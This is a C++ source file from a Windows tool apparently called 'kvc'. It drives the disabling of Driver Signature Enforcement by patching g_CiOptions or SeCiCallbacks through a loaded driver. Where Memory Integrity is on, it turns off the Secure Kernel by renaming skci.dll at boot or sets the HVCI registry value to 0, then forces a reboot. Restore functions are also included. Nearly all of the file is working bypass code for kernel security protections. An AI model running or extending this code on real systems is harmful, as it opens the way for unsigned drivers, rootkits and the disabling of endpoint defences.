// ControllerDSE.cpp
// DSE bypass controller - user interaction layer
// Delegates actual bypass operations to unified DSEBypass class

#include "Controller.h"
#include "SessionManager.h"
#include "common.h"

// ============================================================================
// HELPER: SYSTEM REBOOT
// ============================================================================

static bool InitiateSystemReboot() noexcept {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
    
    if (InitiateShutdownW(NULL, NULL, 0, SHUTDOWN_RESTART | SHUTDOWN_FORCE_OTHERS, 
                          SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != ERROR_SUCCESS) {
        ERROR(L"Failed to initiate reboot: %d", GetLastError());
        return false;
    }
    
    return true;
}

// ============================================================================
// STANDARD METHOD (kvc dse off)
// ============================================================================

bool Controller::DisableDSE() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE bypass");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    // Get current status to check for HVCI
    DSEBypass::Status status;
    if (!m_dseBypass->GetStatus(status)) {
        ERROR(L"Failed to get DSE status");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Current g_CiOptions: 0x%08X", status.CiOptionsValue);
    
    // Check if HVCI (Memory Integrity) is enabled - 0x0001C006 pattern
    if (status.HVCIEnabled) {
        INFO(L"HVCI detected (g_CiOptions = 0x%08X) - hypervisor bypass required", status.CiOptionsValue);
        INFO(L"Preparing secure kernel deactivation (fully reversible)...");
        
        SUCCESS(L"Secure Kernel module prepared for temporary deactivation");
        SUCCESS(L"System configuration: hypervisor bypass prepared (fully reversible)");
        INFO(L"Note: This method temporarily disables Secure Kernel (skci.dll)");
        INFO(L"Secure Kernel and WSL/WSA will be inactive for the next session");
        
        std::wcout << L"\n";
        std::wcout << L"Reboot now to complete DSE bypass? [Y/N]: ";
        
        wchar_t choice;
        std::wcin >> choice;
        
        if (choice != L'Y' && choice != L'y') {
            INFO(L"HVCI bypass cancelled by user");
            m_rtc->Cleanup();
            EndDriverSession(true);
            return true;  // User cancelled, no error
        }
        
        DEBUG(L"Closing driver handle before file operations");
        m_rtc->Cleanup();
        
        DEBUG(L"Unloading and removing driver service");
        EndDriverSession(true);
        
        DEBUG(L"Driver fully unloaded, proceeding with bypass preparation");
        
        // Recreate DSEBypass for file operations (no driver needed)
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
        
        if (!m_dseBypass->RenameSkciLibrary()) {
            ERROR(L"Failed to prepare hypervisor bypass");
            return false;
        }
        
        if (!m_dseBypass->CreatePendingFileRename()) {
            ERROR(L"Failed to create PendingFileRenameOperations");
            return false;
        }
        
        SUCCESS(L"HVCI bypass prepared - reboot required");
        INFO(L"After reboot, g_CiOptions will be 0x00000006 (safe to patch)");
        INFO(L"Run 'kvc dse off' again to complete the bypass");
        
        INFO(L"Initiating system reboot...");
        InitiateSystemReboot();
        
        return true;
    }
    
    // HVCI is off, proceed with standard DSE patching
    bool result = m_dseBypass->Disable(DSEBypass::Method::Standard);
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::RestoreDSE() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE restore");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    bool result = m_dseBypass->Restore(DSEBypass::Method::Standard);
    
    EndDriverSession(true);
    
    return result;
}

// ============================================================================
// SAFE METHOD (kvc dse off --safe)
// ============================================================================

bool Controller::DisableDSESafe() noexcept {
    PerformAtomicCleanup();

    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for Safe DSE bypass");
        return false;
    }

    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }

    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }

    // Get current status to check for HVCI
    DSEBypass::Status status;
    if (!m_dseBypass->GetStatus(status)) {
        ERROR(L"Failed to get DSE status");
        EndDriverSession(true);
        return false;
    }

    // Check if HVCI (Memory Integrity) is enabled - 0x0001C006 pattern
    if (status.HVCIEnabled) {
        INFO(L"Memory Integrity is enabled (g_CiOptions = 0x%08X)", status.CiOptionsValue);
        INFO(L"A reboot is required to disable Memory Integrity before DSE bypass");
        INFO(L"Safe method: preserves VBS functionality (recommended)");
        
        std::wcout << L"\n";
        std::wcout << L"Disable Memory Integrity and reboot now? [Y/N]: ";
        
        wchar_t choice;
        std::wcin >> choice;

        if (choice != L'Y' && choice != L'y') {
            INFO(L"Operation cancelled by user");
            m_rtc->Cleanup();
            EndDriverSession(true);
            return true;  // User cancelled, no error
        }

        // Set HVCI registry to 0
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                          L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
                          0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            DWORD disabled = 0;
            RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, 
                          reinterpret_cast<const BYTE*>(&disabled), sizeof(DWORD));
            RegCloseKey(hKey);
            SUCCESS(L"Memory Integrity disabled in registry");
        } else {
            ERROR(L"Failed to modify HVCI registry key");
            m_rtc->Cleanup();
            EndDriverSession(true);
            return false;
        }

        // Cleanup driver before reboot
        m_rtc->Cleanup();
        EndDriverSession(true);

        INFO(L"Initiating system reboot...");
        INFO(L"After reboot, run 'kvc dse off --safe' again to complete DSE bypass");

        InitiateSystemReboot();

        return true;
    }

    // Memory Integrity is OFF - proceed with SeCiCallbacks patch
    bool result = m_dseBypass->Disable(DSEBypass::Method::Safe);
    EndDriverSession(true);
    return result;
}

bool Controller::RestoreDSESafe() noexcept {
    PerformAtomicCleanup();

    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for Safe DSE restore");
        return false;
    }

    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }

    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }

    // Check if we have saved state before attempting restoration
    auto original = SessionManager::GetOriginalCiCallback();
    if (original == 0) {
        INFO(L"No saved DSE state found in registry");
        
        // Check current DSE state
        auto state = m_dseBypass->CheckSafeMethodState();
        auto stateStr = DSEBypass::GetDSEStateString(state);
        
        INFO(L"Current DSE-NG state: %s", stateStr.c_str());
        
        if (state == DSEBypass::DSEState::NORMAL) {
            SUCCESS(L"DSE is already enabled (normal state)");
            EndDriverSession(true);
            return true;
        } else if (state == DSEBypass::DSEState::PATCHED) {
            ERROR(L"DSE is disabled but no saved state - cannot restore");
            ERROR(L"Run 'kvc dse on' (non-safe) or re-run 'kvc dse off --safe' first");
        }
        
        EndDriverSession(true);
        return false;
    }

    bool result = m_dseBypass->Restore(DSEBypass::Method::Safe);
    EndDriverSession(true);
    return result;
}

// ============================================================================
// STATUS OPERATIONS
// ============================================================================

ULONG_PTR Controller::GetCiOptionsAddress() const noexcept {
    if (!m_dseBypass) {
        return 0;
    }
    
    return m_dseBypass->GetCiOptionsAddress();
}

bool Controller::GetDSEStatus(ULONG_PTR& outAddress, DWORD& outValue) noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE status check");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    DSEBypass::Status status;
    if (!m_dseBypass->GetStatus(status)) {
        EndDriverSession(true);
        return false;
    }
    
    outAddress = status.CiOptionsAddress;
    outValue = status.CiOptionsValue;
    
    EndDriverSession(true);
    return true;
}

// ============================================================================
// DSE-NG STATE CHECKING (for kvc.cpp status display)
// ============================================================================

bool Controller::CheckDSENGState(DSEBypass::DSEState& outState) noexcept {
    if (!m_dseBypass) {
        return false;
    }
    
    outState = m_dseBypass->CheckSafeMethodState();
    return true;
}

std::wstring Controller::GetDSENGStatusInfo() noexcept {
    if (!m_dseBypass) {
        return L"DSEBypass not initialized";
    }
    
    auto state = m_dseBypass->CheckSafeMethodState();
    return DSEBypass::GetDSEStateString(state);
}
